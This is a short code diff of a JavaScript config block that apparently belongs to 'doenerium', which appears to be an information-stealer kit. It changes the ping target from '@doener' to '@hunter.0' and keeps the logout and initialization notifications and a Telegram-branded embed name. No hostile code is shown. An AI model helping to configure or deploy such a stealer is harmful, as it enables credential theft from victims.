@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@hunter.0"],
 
     embed: {
         username: "doenerium | t.me/doenerium",
